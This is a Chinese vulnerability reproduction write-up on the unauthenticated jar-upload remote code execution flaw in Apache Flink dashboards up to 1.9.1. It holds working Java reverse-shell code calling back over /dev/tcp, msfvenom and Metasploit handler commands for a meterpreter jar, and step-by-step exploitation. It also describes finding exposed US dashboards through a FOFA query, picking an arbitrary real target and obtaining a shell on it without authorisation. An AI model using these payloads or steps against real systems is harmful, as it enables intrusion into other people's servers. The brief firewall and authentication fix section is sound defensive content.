原创： Mature 合天智汇

原创投稿活动：[重金悬赏 |
合天原创投稿等你来](http://link.zhihu.com/?target=https%3A//mp.weixin.qq.com/s/Nw2VDyvCpPt_GG5YKTQuUQ)

## 漏洞描述:  

2019年11月11号，安全工程师Henry Chen披露了一个Apache Flink未授权上传jar包导致远程代码执行的漏洞。由于Apache
Flink Dashboard 默认无需认证即可访问,通过上传恶意jar包并触发恶意代码执行,从而获取shell。

## 影响范围  

<= 1.9.1(最新版本)

## 环境搭建:  

(1) 提前安装好java(需要java8以上)

![v2-6e3bf0fb01e57986adf10f21ef0b2637_hd.j](https://pic4.zhimg.com/80/v2-6e3bf0fb01e57986adf10f21ef0b2637_hd.jpg)

(2) 下载flink-1.9.1

下载地址:https://www.apache.org/dyn/closer.lua/flink/flink-1.9.1/flink-1.9.1-bin-scala_2.11.tgz

(3) 解压下载的压缩包:

tar -zxf flink-1.9.1-bin-scala_2.11.tgz

(4) 进去到解压后的目录中,来到其bin目录下:

![v2-ce381162a5ee94a212a6bb0214052c50_hd.j](https://pic2.zhimg.com/80/v2-ce381162a5ee94a212a6bb0214052c50_hd.jpg)

(5) 启动flink:

./start-cluster.sh

(6) 浏览器访问验证(默认端口为8081):

http://172.26.1.108:8081

![v2-68582e17f653add1a111b69c1f131d63_hd.j](https://pic3.zhimg.com/80/v2-68582e17f653add1a111b69c1f131d63_hd.jpg)

出现上图即搭建成功.

(7) 设置开机自启(这里折腾了好久,一直起不来.直接source
/etc/rc.d/rc.local可以启动,但是重启后并不会启动flink,最后在一篇博客中找到了解决方法)

![v2-82e4cbb8cab9126b4de46fc469b278b1_hd.j](https://pic1.zhimg.com/80/v2-82e4cbb8cab9126b4de46fc469b278b1_hd.jpg)

开机自启设置参考:

https://www.cnblogs.com/aaronlinux/p/6804531.html

## 漏洞复现:  

jar包制作步骤:

(1) 参考https://klionsec.github.io/2016/09/27/revese-shell/#menu文中给出的利用java反弹shell

![v2-20c8b7926928dca29fad99b4fa0f942e_hd.j](https://pic3.zhimg.com/80/v2-20c8b7926928dca29fad99b4fa0f942e_hd.jpg)

记得修改ip和端口:

![v2-1d3da295739d48f530102e1060d78319_hd.j](https://pic4.zhimg.com/80/v2-1d3da295739d48f530102e1060d78319_hd.jpg)

代码:

package shell;public class Revs { /** * @param args * @throws Exception */
public static void main(String[] args) throws Exception { // TODO Auto-generated method stub Runtime r = Runtime.getRuntime(); String cmd[]=
{"/bin/bash","-c","exec 5<>/dev/tcp/192.168.1.12/9999;cat <&5 | while read
line; do $line 2>&5 >&amp5 done"}; Process p = r.exec(cmd); p.waitFor(); }}

(2) 利用eclipse将其导出为一个可执行的jar包: a. 点击 File-->Export(导出)

![v2-9b9df1894790ad5b8164ba7d948b8f78_hd.j](https://pic1.zhimg.com/80/v2-9b9df1894790ad5b8164ba7d948b8f78_hd.jpg)

b.然后选择java-->Runnable JAR file

![v2-a79dd9457188e3e68ca0dd1759f40469_hd.j](https://pic1.zhimg.com/80/v2-a79dd9457188e3e68ca0dd1759f40469_hd.jpg)

c.然后选择对应的java项目和导出路径以及导出文件名

![v2-e9ca51b1d4d13230352659c80d7504b8_hd.j](https://pic1.zhimg.com/80/v2-e9ca51b1d4d13230352659c80d7504b8_hd.jpg)

图片

这样就生成了一个反弹shell的jar包

msf生成jar马:

(1) 利用msfvenom来生成一个jar马:

msfvenom -p java/meterpreter/reverse_tcp LHOST=172.26.1.156 LPORT=9999 W
>text.jar

(2) 打开msf的监听模块,并监听9999端口(要与我们jar马设置的端口一致)

use exploit/multi/handlerset payload java/meterpreter/reverse_tcpset LHOST
172.26.1.156set LPORT 9999exploit

(3) 上传我们生成的jar马并提交后(这部分操作参考下面的复现),可以看到我们成功接收到shell:

![v2-9e7d7b7e7127a254a6bb459e419d355d_hd.j](https://pic1.zhimg.com/80/v2-9e7d7b7e7127a254a6bb459e419d355d_hd.jpg)

本地复现:

(1) 访问目标:

![v2-af7e32d1987e8f89e7dcea9a60ea9d6e_hd.j](https://pic4.zhimg.com/80/v2-af7e32d1987e8f89e7dcea9a60ea9d6e_hd.jpg)

(2) 点击Submit New job,打开上传jar包的页面:

![v2-3ef5ef560e5b57dee1a3065e7c1a4a16_hd.j](https://pic3.zhimg.com/80/v2-3ef5ef560e5b57dee1a3065e7c1a4a16_hd.jpg)

(3) 点击Add New选择我们制作好的jar包:

![v2-6638f05b46201b56bdec128d259af7b5_hd.j](https://pic1.zhimg.com/80/v2-6638f05b46201b56bdec128d259af7b5_hd.jpg)

(4) 我们的机器上监听好端口(我们制作的jar包是直接反弹shell的)

(5) 点击我们刚刚上传的jar包:

![v2-77403badadeb4dad6d15db74ab99577a_hd.j](https://pic2.zhimg.com/80/v2-77403badadeb4dad6d15db74ab99577a_hd.jpg)

(6) 然后点击Submit即可,可以看到我们已经成功接收到了shell:

![v2-c58c2e48d8269e8818688d10b955ca42_hd.j](https://pic4.zhimg.com/80/v2-c58c2e48d8269e8818688d10b955ca42_hd.jpg)

互联网站点:

fofa关键词:

"apache-flink-dashboard" && country="US"

![v2-55f8a125bc4305a56feb348ebd5fc66c_hd.j](https://pic4.zhimg.com/80/v2-55f8a125bc4305a56feb348ebd5fc66c_hd.jpg)

(1) 随便找一个目标:

![v2-194516eab96ea3452fe8510e11498f2f_hd.j](https://pic4.zhimg.com/80/v2-194516eab96ea3452fe8510e11498f2f_hd.jpg)

(2) 点击Submit new Job,可以看到其可以允许我们上传jar包

![v2-6b1be0b8fdef5194b264172f1a960f66_hd.j](https://pic4.zhimg.com/80/v2-6b1be0b8fdef5194b264172f1a960f66_hd.jpg)

(3) 利用flink上传jar包的功能将我们的jar包上传:

![v2-51f9e4b7cc2686c134ae3d64c3c94846_hd.j](https://pic2.zhimg.com/80/v2-51f9e4b7cc2686c134ae3d64c3c94846_hd.jpg)

(4) 上传后,我们在我们的vps上监听好端口

(5) 然后回到浏览器,选中我们刚刚上传的jar包,然后点击Submitting提交,可以看到我们的vps已经成功接收到了shell

![v2-49a4605231a0dd1e65af47807d580123_hd.j](https://pic2.zhimg.com/80/v2-49a4605231a0dd1e65af47807d580123_hd.jpg)

## 漏洞修复:  

建议设置防火墙策略，仅允许白名单ip访问 apache flink服务，并在Web代理（如apache httpd）中增加对该服务的digest认证。

时刻关注官网,等待新版本或补丁更新

## 参考链接:  

flink安装https://s.tencent.com/research/bsafe/841.htmlhttps://mp.weixin.qq.com/s?src=11&amptimestamp=1573607236&ver=1971&signature=roySoRWnz5MgPLuikntTt3rx7rWFdFBOOQfI5rmaOe-d1LWj7NEJxkVBvzfjKtpuihSaRk*EVBoHJ5Roh48qdTm3v2jbU8EW**As8i3ylp3OOskx7IUXnKXqDU5tcUfn&new=1https://klionsec.github.io/2016/09/27/revese-shell/#menu

声明：笔者初衷用于分享与普及网络知识，若读者因此作出任何危害网络安全行为后果自负，与合天智汇及原作者无关！

  

